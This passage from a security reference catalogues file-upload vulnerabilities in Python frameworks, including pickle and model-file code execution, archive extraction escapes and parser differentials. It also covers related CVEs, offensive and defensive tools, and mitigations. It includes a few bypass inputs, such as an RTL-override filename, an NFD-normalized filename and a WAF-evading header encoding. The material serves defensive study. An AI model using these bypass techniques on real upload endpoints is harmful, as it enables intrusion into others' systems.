| **`tarfile` symlink/hardlink escape** | Tar archives can contain symbolic links pointing to `/etc/passwd` or hardlinks to `/etc/shadow`. Extraction preserves these links, enabling arbitrary file read. | `tarfile.extractall()` without member filtering |
| **`tarfile` device file creation** | Tar entries specifying character/block device files create device nodes on extraction. | Extraction with root privileges |
| **`tarfile` SETUID bit preservation** | Tar archives preserve Unix permission bits including setuid/setgid. Extracted files may have elevated privilege attributes. | `tarfile.extractall()` preserving permissions |
| **`tarfile` data_filter (3.12+)** | Python 3.12 added `tarfile.extractall(filter='data')` which strips absolute paths, rejects `..` components, blocks symlinks/hardlinks/device files, and normalizes permissions. | Python < 3.12; or 3.12+ without `filter='data'` |
| **`gzip`/`bz2`/`lzma` decompression bomb** | Python's compression modules have no built-in size limits. A 10 MB gzip file can decompress to multiple GB, exhausting memory. | No manual decompressed size limit enforcement |
| **Nested archive bomb** | Recursive extraction of archives-within-archives bypasses single-level decompression limits. | Recursive extraction without depth/size limits |

### §10-3. Python ML Model Deserialization

Machine learning model files represent a critical and frequently overlooked file upload attack surface. Most ML serialization formats allow arbitrary code execution during deserialization.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Pickle RCE via `__reduce__`** | Uploaded `.pkl`, `.pickle`, `.joblib` files execute arbitrary code through the `__reduce__` method during `pickle.load()`. Attackers can craft raw pickle opcodes (`GLOBAL`, `REDUCE`, `STACK_GLOBAL`) that bypass naive `__reduce__` string scanning. | Any Python app using `pickle.load()` / `joblib.load()` on user-uploaded files |
| **Joblib compressed pickle** | `joblib` uses pickle internally but supports `.pkl.gz`, `.pkl.bz2`, `.pkl.xz` — compressed pickle that decompresses then deserializes. Compression evades content-based scanning. | `joblib.load()` on uploaded files |
| **Keras .h5 Lambda layer RCE** | Keras `.h5` model files embed architecture as JSON containing base64-encoded pickle in Lambda layer definitions. `keras.models.load_model()` deserializes the Lambda function. (CVE-2024-3660, CVSS 9.8) | `tf.keras.models.load_model()` without `safe_mode=True` |
| **PyTorch `torch.load()` RCE** | PyTorch `.pt` / `.pth` files use pickle for serialization. `torch.load()` is equivalent to `pickle.load()`. PyTorch 2.6+ defaults to `weights_only=True` but older versions do not. | `torch.load()` without `weights_only=True` |
| **ONNX custom operator loading** | ONNX models can reference custom operator shared libraries (`.so`/`.dll`). ONNX Runtime loads these at inference time. A crafted `.onnx` file can specify a path to a malicious shared library. (CVE-2024-27318) | ONNX Runtime loading untrusted models |
| **NumPy `.npy`/`.npz` pickle** | `numpy.load()` with `allow_pickle=True` (default before NumPy 1.16.3) deserializes embedded pickle objects in `.npy`/`.npz` files. | `numpy.load(allow_pickle=True)` on uploaded files |
| **SafeTensors (defense)** | Hugging Face's `safetensors` format stores only raw tensor data with a JSON header. No arbitrary object deserialization. The only ML serialization format safe by construction. | Migration to SafeTensors for model weight storage |

### §10-4. Python Document & Image Processing

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Pillow EXIF/TIFF buffer overflow** | Pillow's TiffImagePlugin has had multiple out-of-bounds read vulnerabilities in EXIF parsing. Crafted EXIF data in JPEG/TIFF files triggers heap corruption. (CVE-2021-25287, CVE-2021-25288) | Pillow processing untrusted images |
| **Pillow decompression bomb** | Images with extreme pixel counts (e.g., 1×1 pixel decompressing to gigapixels) exhaust memory. `Image.MAX_IMAGE_PIXELS` defaults to ~89M pixels but can be disabled. (CVE-2023-44271) | `Image.MAX_IMAGE_PIXELS = None` or very high limit |
| **Pillow GIF frame bomb** | GIFs with thousands of frames (10,000+) consume excessive memory/CPU when iterating with `img.seek()`. No built-in frame count limit. | Processing animated GIFs without frame count validation |
| **Pillow font rendering (FreeType)** | Loading untrusted `.ttf`/`.otf` files via `ImageFont.truetype()` exposes FreeType's attack surface. (CVE-2020-15999 — FreeType heap buffer overflow) | Accepting user-uploaded fonts |
| **Wand/ImageMagick binding** | Wand is a Python binding for ImageMagick. All ImageMagick vulnerabilities (ImageTragick, SSRF via SVG, delegate injection) apply directly. | Using Wand for image processing without restrictive `policy.xml` |
| **CairoSVG/WeasyPrint SSRF** | CairoSVG renders SVG server-side. SVG `<image>`, `<use>`, `<foreignObject>` elements with external URLs trigger SSRF. WeasyPrint (HTML/CSS to PDF) fetches external resources from user-controlled HTML. | Server-side SVG/HTML-to-PDF conversion |
| **ReportLab RCE** | ReportLab's paragraph markup supports `<para>` tags that can reference Python code. Crafted input to PDF generation achieves code execution. (CVE-2023-33733) | ReportLab processing user-controlled input |
| **PyMuPDF (MuPDF) buffer overflow** | PyMuPDF wraps MuPDF C library. Crafted PDFs trigger buffer overflows in annotation parsing. (CVE-2023-38560, CVSS 7.5) | Server-side PDF processing with PyMuPDF |
| **pypdf infinite loop/recursion** | Crafted PDFs with circular references or deeply nested objects cause infinite loops or stack overflow in pypdf's parser. (CVE-2023-36807, CVE-2023-36464) | PDF parsing with pypdf without timeout/recursion limits |
| **openpyxl/xlrd XXE** | XLSX files are ZIP archives containing XML. `openpyxl` and `xlrd` may process embedded XML without disabling external entities, enabling XXE. | Parsing uploaded XLSX without `defusedxml` |

### §10-5. Python Filename & Encoding Edge Cases

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Unicode normalization differential** | Different Unicode normalization forms (NFC vs NFD) produce visually identical but bytewise different filenames. A filter blocking `naïve.js` (NFC) may miss `na\u0308ive.js` (NFD, combining diaeresis). | Filename: `na\u0308ive.js` bypasses NFC-normalized blocklist |
| **`mimetypes` module inconsistency** | Python's `mimetypes.guess_type()` returns platform-dependent results. On Windows, it queries the registry; on Linux, it reads `/etc/mime.types`. The same extension may map to different MIME types across platforms. | `.svg` → `image/svg+xml` on Linux, potentially different on Windows |
| **`cgi.parse_header` deprecation** | `cgi.parse_header()` (used internally by many frameworks for Content-Disposition parsing) was deprecated in 3.11 and removed in 3.13. Transitioning to `email.message.Message` alters parsing behavior for edge cases (extra semicolons, unquoted values). | Behavioral change in multipart header parsing across Python versions |
| **RTL override not stripped** | Python does not automatically strip Unicode bidirectional control characters (`U+202E` RLO, `U+202D` LRO). Werkzeug's `secure_filename()` does not remove them. | `document\u202Etxt.exe` displays as `documentexe.txt` |
| **Windows reserved name collision** | `secure_filename()` does not reject Windows reserved device names (`CON`, `PRN`, `AUX`, `NUL`, `COM1`–`COM9`, `LPT1`–`LPT9`). Writing to these names on Windows causes unexpected behavior or hangs. | `filename="CON.txt"` → hangs on Windows |

### §10-6. Python Async & Race Condition Vectors

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Async TOCTOU** | In async frameworks (FastAPI, Starlette, aiohttp), existence-check-then-write race conditions are amplified because multiple coroutines share the same event loop and filesystem. Between `await path.exists()` and `await file.write()`, another coroutine can create a symlink at the target path. | Async upload handlers without atomic write operations |
| **`UploadFile.read()` memory exhaustion** | `await file.read()` in FastAPI reads the entire file into memory at once. Without `MAX_CONTENT_LENGTH` enforcement, concurrent large uploads exhaust worker memory. | FastAPI/Starlette without explicit size limiting middleware |
| **Concurrent filename collision** | Multiple simultaneous uploads with identical filenames overwrite each other. Django's `Storage.get_available_name()` handles this, but custom async implementations often don't. | Custom async upload handlers using original filenames |
| **Chunked Transfer-Encoding bypass** | Some WSGI servers (Gunicorn sync workers) buffer the entire chunked request before passing to the application. `Content-Length`-based size checks are bypassed because the header is absent in chunked requests. | Size validation relying on `Content-Length` header rather than actual bytes read |

### §10-7. Python Cloud Storage Integration

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **S3 presigned URL without conditions** | `boto3.generate_presigned_url('put_object')` without `ContentType` restriction allows uploading any content type. Presigned URLs cannot restrict `Content-Length`; use presigned POST with conditions instead. | Presigned PUT URLs without MIME type enforcement |
| **S3 presigned POST condition bypass** | `generate_presigned_post()` conditions using `starts-with` can be overly permissive. `['starts-with', '$Content-Type', '']` allows any content type. | Misconfigured presigned POST conditions |
| **django-storages path handling** | `S3Boto3Storage` does not call `os.path.basename()` on filenames. While S3 has a flat namespace (no real path traversal), files downloaded from S3 and saved locally with the original key path reintroduce traversal. | Files stored with traversal-pattern keys, later extracted to local filesystem |
| **django-storages ACL misconfiguration** | `AWS_DEFAULT_ACL = 'public-read'` makes all uploaded files publicly accessible. Default changed to `None` in django-storages 1.10+, deferring to bucket policy. | Explicit `public-read` ACL or pre-1.10 defaults |

### Python-Specific CVE / Advisory Mapping (2023–2025)

| Mutation Category | CVE / Advisory | Impact |
|-------------------|---------------|--------|
| §10-1 (Django upload DoS) | CVE-2023-24580 | CVSS 7.5. DoS via unlimited file count per request. Led to introduction of `DATA_UPLOAD_MAX_NUMBER_FILES` in Django 4.2. |
| §10-1 (Starlette multipart DoS) | CVE-2024-47874 | CVSS 8.0. Multipart parser CPU exhaustion via crafted Content-Disposition headers. |
| §10-1 (Starlette path traversal) | CVE-2024-47824 | Directory traversal in `StaticFiles` serving uploaded content. |
| §10-3 (Keras model RCE) | CVE-2024-3660 | CVSS 9.8. RCE via Lambda layer deserialization in .h5 model files. |
| §10-3 (ONNX Runtime path traversal) | CVE-2024-27318 | CVSS 7.5. Path traversal in custom operator shared library loading. |
| §10-3 (scikit-learn pickle) | CVE-2024-5206 | CVSS 7.5. Sensitive data disclosure via pickle serialization of models. |
| §10-4 (Pillow decompression) | CVE-2023-44271 | DoS via crafted image exceeding pixel limits. |
| §10-4 (ReportLab RCE) | CVE-2023-33733 | RCE via paragraph markup in PDF generation. |
| §10-4 (PyMuPDF buffer overflow) | CVE-2023-38560 | CVSS 7.5. Buffer overflow in PDF annotation parsing via MuPDF. |
| §10-4 (pypdf infinite loop) | CVE-2023-36807 | DoS via crafted PDF causing infinite loop in parser. |
| §10-4 (Jinja2 XSS) | CVE-2024-34064 | XSS when rendering uploaded filenames in templates without `|e` escaping. |

---

## Detection Tools

### Offensive / Testing Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Fuxploider** (Python) | Automated file upload vulnerability scanner | Detects permitted file types and determines best technique for webshell upload |
| **Fuxploider-NG** (Python) | Extended scanner with XSS detection | Adds XSS detection in filenames and file content; evaluated at DIMVA 2024 |
| **Upload Scanner** (Burp Extension, PortSwigger) | Comprehensive file upload testing | Tests extension/content-type/magic byte combinations; polyglot generation; SSRF via processing |
| **PayloadsAllTheThings** (Cheat sheet) | File upload payload repository | Curated payloads for all bypass techniques organized by language/server |
| **ExifTool** (Perl) | Metadata injection for polyglot creation | Embeds code in image EXIF fields for polyglot file generation |
| **Burp Suite Intruder** (Proxy) | Extension/MIME fuzzing | Fuzzes extension and Content-Type combinations against validation |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **ClamAV** (Scanner) | Virus/malware detection on uploads | Signature-based scanning of uploaded file content |
| **OPSWAT MetaDefender** (Platform) | Deep content inspection / CDR | Multi-engine scanning; Content Disarm and Reconstruction removes active content |
| **Apache Tika** (Java library) | Reliable MIME detection | Content-based MIME type detection independent of extension/header |
| **python-magic / libmagic** (Library) | Magic byte verification | Validates file content signature against known format database |
| **ModSecurity + OWASP CRS** (WAF) | Upload request filtering | Rule 933110 for PHP uploads; multipart parsing (with known bypass limitations per §4) |
| **file-type** (Node.js library) | File type detection from content | Detects file type from magic bytes; no reliance on extension |

---

## Summary: Core Principles

### Why File Upload is a Permanent Attack Surface

The fundamental tension is that **files are both data and code**. A JPEG is data to a file storage system but code to an image processor. A PHP file is data to a download endpoint but code to the PHP interpreter. An SVG is an image to a browser and an XML document to a parser. File upload vulnerabilities exist wherever this duality is not fully accounted for across every component in the processing chain.

### Why Incremental Fixes Fail

Each defense targets a single layer: extension blocklists address naming, Content-Type validation addresses headers, magic byte checks address content signatures. Attackers compose mutations across layers — a polyglot file (§3) with a double extension (§1) uploaded via a multipart parser differential (§4) to a directory with a crafted `.htaccess` (§6). The combinatorial explosion of cross-layer mutations means that single-layer defenses will always have bypass paths.

Furthermore, the multipart/form-data transport protocol itself is a source of permanent ambiguity. RFC 7578 leaves enough implementation latitude that no two parsers behave identically (§4). As long as WAFs and backend parsers disagree on how to interpret the same byte stream, validation bypasses will exist.

### Structural Solutions

1. **Separation of storage and execution**: Upload files to a storage-only location (object storage, non-executable filesystem) that is never served through a server-side interpreter. Serve files through a separate, static-file-only domain.
2. **Content Disarm and Reconstruction (CDR)**: Instead of detecting malicious content, strip all active content and reconstruct the file in a known-safe format. Convert all images to a canonical format; flatten all documents.
3. **Separate origin for user content**: Serve all user-uploaded files from a different origin (e.g., `uploads.example.com` or a CDN with no cookie scope) to eliminate same-origin XSS impact.
4. **Atomic validation**: Validate before writing to accessible storage. Never expose a file to any request path until all checks have passed.
5. **Filename rejection, not sanitization**: Generate server-side filenames (UUIDs); never use the client-supplied filename for storage. The original filename is metadata, not a filesystem path.

---

## References

### Academic Papers & Conference Presentations

1. **Koyuncu, A., Bisschop, T., Pellegrino, G., et al.** "WAFFLED: A Framework for Testing WAF Multipart Form-Data Parsing." *Proceedings of the Annual Computer Security Applications Conference (ACSAC)*, 2025. Discovered 1,207 WAF bypass vectors through systematic multipart/form-data parsing differentials across PHP, Node.js, Python backends and major WAFs including FortiWeb, Barracuda, AWS WAF, and ModSecurity/OWASP CRS.

2. **Brisset, B., Music, D., Pellegrino, G.** "Fuxploider-NG: An Automated File Upload Vulnerability Scanner with XSS Detection." *Proceedings of the 21st International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (DIMVA)*, 2024. Extended the original Fuxploider with XSS detection in filenames and file content.

3. **Snyk Security Research Team.** "Zip Slip Vulnerability." Snyk, June 2018. URL: `https://snyk.io/research/zip-slip-vulnerability`. Disclosed a widespread directory traversal vulnerability during archive extraction affecting thousands of projects across Java, .NET, Ruby, JavaScript, Go, and other ecosystems.

4. **ImageTragick Research Team.** "ImageTragick." 2016. URL: `https://imagetragick.com/`. Coordinated disclosure of CVE-2016-3714 and related ImageMagick vulnerabilities enabling RCE through crafted SVG/MVG files via the delegate processing system.

5. **Slaviero, M.** "Content-Type: application/hax -- Abusing File Processing in Web Applications." *Black Hat USA*, 2015. File upload exploitation techniques including polyglot file construction and processing pipeline abuse.

6. **Kettle, J.** "Smashing the State Machine: the True Potential of Web Race Conditions." *Black Hat USA / DEF CON 31*, 2023. PortSwigger Research. Foundational research on race conditions applicable to upload-then-validate races (Section 9).

7. **Tsai, O.** "A New Era of SSRF -- Exploiting URL Parsers in Trending Programming Languages!" *Black Hat USA*, 2017. Relevant to URL-based upload race conditions and remote fetch exploitation (Section 9-2).

8. **Munoz, A., Mirosh, O.** "Friday the 13th: JSON Attacks." *Black Hat USA*, 2017. Relevant to deserialization via file upload vectors (Section 7-4).

### RFCs & Standards

9. **Masinter, L.** "Returning Values from Forms: multipart/form-data." RFC 7578, IETF, July 2015. URL: `https://www.rfc-editor.org/rfc/rfc7578`. Defines the multipart/form-data encoding used for file uploads. Ambiguities in this specification directly enable the parser differentials documented in Section 4.

10. **Reschke, J.** "Use of the Content-Disposition Header Field in the Hypertext Transfer Protocol (HTTP)." RFC 6266, IETF, June 2011. URL: `https://www.rfc-editor.org/rfc/rfc6266`. Defines the `Content-Disposition` header including the `filename*=` extended parameter exploited in Section 4-3.

11. **Freed, N., Borenstein, N.** "Multipurpose Internet Mail Extensions (MIME) Part Two: Media Types." RFC 2046, IETF, November 1996. URL: `https://www.rfc-editor.org/rfc/rfc2046`. Defines MIME media types and multipart boundary syntax foundational to Content-Type manipulation (Section 2).

12. **Barth, A.** "Media Type Sniffing." W3C MIME Sniffing Standard / RFC 6838. Relevant to browser MIME sniffing exploitation (Section 2-2 and Section 8-2).

### CVE References

13. **CVE-2024-53677** -- Apache Struts 2, file upload path traversal. CVSS 9.5. File upload parameter manipulation enables path traversal to restricted directories. Actively exploited in the wild, 2024. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-53677`

14. **CVE-2024-50623** -- Cleo Harmony / VLTrader / LexiCom, unrestricted file upload and download with autorun exploitation. Unauthenticated RCE. Mass exploitation by ransomware groups, 2024. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-50623`

15. **CVE-2024-57968** -- Advantive VeraCore, unrestricted file upload to unintended directories. CVSS 9.9. Authenticated users can upload files to arbitrary directories, 2024. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-57968`

16. **CVE-2024-5911** -- Palo Alto Networks Panorama, arbitrary file upload causing system disruption. Authenticated admin can upload files causing system crash and maintenance mode, 2024. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-5911`

17. **CVE-2024-31210** -- WordPress, plugin/theme upload RCE vulnerability. Extension bypass combined with configuration override enables remote code execution through crafted plugin packages, 2024. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-31210`

18. **CVE-2024-31280** -- WordPress church-admin plugin, arbitrary file upload in ZIP handling. Patched twice and bypassed twice, demonstrating the difficulty of incremental file upload fixes, 2024. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-31280`

19. **CVE-2025-57803** -- ImageMagick, 32-bit integer overflow in BMP encoder. CVSS 9.8. Heap corruption via scanline-stride computation exploitable through upload-and-convert workflows, 2025. URL: `https://nvd.nist.gov/vuln/detail/CVE-2025-57803`

20. **CVE-2025-54418** -- CodeIgniter4, ImageMagick handler vulnerability in framework's image processing library, 2025. URL: `https://nvd.nist.gov/vuln/detail/CVE-2025-54418`

21. **CVE-2021-22204** -- ExifTool, RCE via crafted DjVu file. Versions 7.44 through 12.23 evaluate Perl code embedded in DjVu filenames during metadata extraction. $20,000 GitLab bounty, 2021. URL: `https://nvd.nist.gov/vuln/detail/CVE-2021-22204`

22. **CVE-2018-1002200** -- Zip Slip, path traversal via archive extraction. Affected libraries across Java, .NET, Ruby, JavaScript, and Go. Snyk Research, 2018. URL: `https://nvd.nist.gov/vuln/detail/CVE-2018-1002200`

23. **CVE-2016-3714** -- ImageTragick, ImageMagick delegate command injection. Crafted SVG/MVG files achieve RCE through ImageMagick's delegate processing system, 2016. URL: `https://nvd.nist.gov/vuln/detail/CVE-2016-3714`

24. **CVE-2017-8291 and related** -- GhostScript command execution via PostScript/EPS files, enabling RCE through ImageMagick's delegated PDF/PS processing. Multiple CVEs across 2017--2019. URL: `https://nvd.nist.gov/vuln/detail/CVE-2017-8291`

### Tool Repositories

25. **almandin.** "Fuxploider -- File Upload Vulnerability Scanner and Exploitation Tool." GitHub, 2018. URL: `https://github.com/almandin/fuxploider`. Automated scanner that detects permitted file types and determines optimal webshell upload techniques.

26. **Brisset, B.** "Fuxploider-NG -- Next Generation File Upload Vulnerability Scanner." GitHub, 2024. URL: `https://github.com/Bigb972/fuxploider-ng`. Extended version with XSS detection capabilities for filenames and file content.

27. **Mohl, F. (PortSwigger).** "Upload Scanner -- Burp Suite Extension." BApp Store / GitHub. URL: `https://github.com/portswigger/upload-scanner`. Comprehensive file upload testing extension that tests extension/Content-Type/magic byte combinations and generates polyglot files.

28. **swisskyrepo.** "PayloadsAllTheThings -- Upload Insecure Files." GitHub. URL: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files`. Community-maintained repository of file upload bypass payloads organized by language and server type.

29. **Phil Harvey.** "ExifTool." URL: `https://exiftool.org/`. Perl library and command-line tool for reading/writing metadata. Used offensively for polyglot file creation via EXIF metadata injection (Section 3-2).

### OWASP & Industry Guidance

30. **OWASP.** "Unrestricted File Upload." OWASP Web Security Testing Guide. URL: `https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload`. Foundational reference for file upload vulnerability classification and mitigation.

31. **OWASP.** "File Upload Cheat Sheet." OWASP Cheat Sheet Series. URL: `https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html`. Defensive guidance covering validation, storage, and serving best practices.

32. **OWASP ModSecurity Core Rule Set (CRS).** Rule 933110 and related rules for PHP file upload detection. URL: `https://github.com/coreruleset/coreruleset`. Note: bypassed by `filename*=UTF-8''` encoding as documented in Section 4-3 and the WAFFLED research.

### PortSwigger / Web Security Academy

33. **PortSwigger.** "File Upload Vulnerabilities." Web Security Academy. URL: `https://portswigger.net/web-security/file-upload`. Comprehensive tutorial covering extension validation bypass, Content-Type manipulation, webshell upload, and race conditions with interactive labs.

34. **PortSwigger.** "Race Conditions." Web Security Academy. URL: `https://portswigger.net/web-security/race-conditions`. Relevant to Section 9 temporal exploitation techniques.

### HackerOne Reports & Bug Bounty Disclosures

35. **HackerOne Report #223203** -- Shopify SVG Upload SSRF. Server-side SVG rendering triggered SSRF via uploaded SVG `<image>` and `<use>` elements referencing internal URLs. URL: `https://hackerone.com/reports/223203`

36. **HackerOne / GitLab.** ExifTool RCE (CVE-2021-22204). $20,000 bounty for RCE via crafted DjVu file uploaded to GitLab's file processing pipeline, 2021.

### Blog Posts & Technical Writeups

37. **Snyk Security Research.** "Zip Slip Vulnerability -- Technical Writeup." June 2018. URL: `https://snyk.io/research/zip-slip-vulnerability`. Coordinated disclosure of CVE-2018-1002200 with comprehensive affected library inventory across multiple ecosystems.

38. **Corben, S.** "Bypassing Web Application Firewalls with Multipart/Form-Data." Various blog posts and conference talks, 2019--2023. Foundational work on WAF bypass via multipart parser differentials preceding the WAFFLED systematic study.

39. **Golunski, D.** "PHP-FPM Remote Code Execution (CVE-2019-11043)." 2019. Relevant to `.user.ini` configuration override exploitation in PHP-FPM environments (Section 6-2).

40. **Tsai, O.** "A Wormable XSS on HackMD!" 2019. Demonstrated SVG-based stored XSS and inline rendering exploitation relevant to Sections 7-2 and 8-2.

### Python Ecosystem References

41. **Django Software Foundation.** "File Uploads." Django Documentation. URL: `https://docs.djangoproject.com/en/5.0/topics/http/file-uploads/`. Official documentation covering `MemoryUploadedFile`, `TemporaryUploadedFile`, upload handlers, and security settings (`DATA_UPLOAD_MAX_NUMBER_FILES`, `FILE_UPLOAD_MAX_MEMORY_SIZE`).

42. **Pallets / Werkzeug.** "werkzeug.utils.secure_filename." Werkzeug Documentation. URL: `https://werkzeug.palletsprojects.com/`. Documents the limitations of filename sanitization including non-ASCII stripping and missing Windows reserved name handling.

43. **CVE-2023-24580** -- Django DoS via unlimited file uploads per multipart request. CVSS 7.5. URL: `https://nvd.nist.gov/vuln/detail/CVE-2023-24580`. Led to the introduction of `DATA_UPLOAD_MAX_NUMBER_FILES` in Django 4.2.

44. **CVE-2024-47874** -- Starlette multipart parser DoS via crafted Content-Disposition. CVSS 8.0. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-47874`.

45. **CVE-2024-3660** -- Keras .h5 model file RCE via Lambda layer deserialization. CVSS 9.8. URL: `https://nvd.nist.gov/vuln/detail/CVE-2024-3660`.

46. **CVE-2023-33733** -- ReportLab RCE via paragraph markup in PDF generation. URL: `https://nvd.nist.gov/vuln/detail/CVE-2023-33733`.

47. **CVE-2023-44271** -- Pillow DoS via crafted image exceeding pixel limits. URL: `https://nvd.nist.gov/vuln/detail/CVE-2023-44271`.

48. **Python Software Foundation.** "tarfile — Read and write tar archive files: Extraction filters." Python 3.12 Documentation. URL: `https://docs.python.org/3/library/tarfile.html#extraction-filters`. Documents `filter='data'` parameter introduced in Python 3.12 for safe archive extraction blocking symlinks, hardlinks, device files, absolute paths, and path traversal.

49. **Python Software Foundation.** "zipfile — Work with ZIP archives: ZipFile.extractall() filter parameter." Python 3.12 Documentation. URL: `https://docs.python.org/3/library/zipfile.html`. Documents `filter='data'` for ZIP extraction.

50. **Hugging Face.** "SafeTensors — A Safe Serialization Format for Machine Learning." GitHub. URL: `https://github.com/huggingface/safetensors`. The only ML model serialization format designed to be safe by construction — stores only raw tensor data with JSON metadata, no arbitrary code execution.

51. **Trail of Bits.** "Fickling — A Python Pickle Decompiler and Static Analyzer." GitHub. URL: `https://github.com/trailofbits/fickling`. Static analysis tool for detecting malicious pickle payloads including raw opcode-level exploits that bypass `__reduce__` scanning.

52. **Python Software Foundation.** "defusedxml — Defused XML Bombs and External Entities." PyPI. URL: `https://pypi.org/project/defusedxml/`. Drop-in replacement for Python's XML libraries that blocks XXE, billion-laughs, and external entity resolution. Essential for processing uploaded XLSX/DOCX/SVG files.

### Defensive Tools & Libraries

53. **ClamAV.** Open-source antivirus engine. URL: `https://www.clamav.net/`. Signature-based scanning for uploaded file content.

54. **OPSWAT.** "MetaDefender -- Deep Content Inspection and CDR Platform." URL: `https://www.opswat.com/products/metadefender`. Multi-engine scanning with Content Disarm and Reconstruction for active content removal.

55. **Apache Software Foundation.** "Apache Tika -- Content Detection and Analysis Framework." URL: `https://tika.apache.org/`. Java library for reliable MIME type detection based on file content rather than extension or declared Content-Type.

56. **Abarber.** "python-magic." Python interface to libmagic for file type identification. URL: `https://github.com/ahupp/python-magic`. Magic byte verification independent of file extension.

57. **sindresorhus.** "file-type." Node.js library for detecting file type from magic bytes. URL: `https://github.com/sindresorhus/file-type`. Content-based file type detection without extension reliance.

---

*This document was created for defensive security research and vulnerability understanding purposes.*
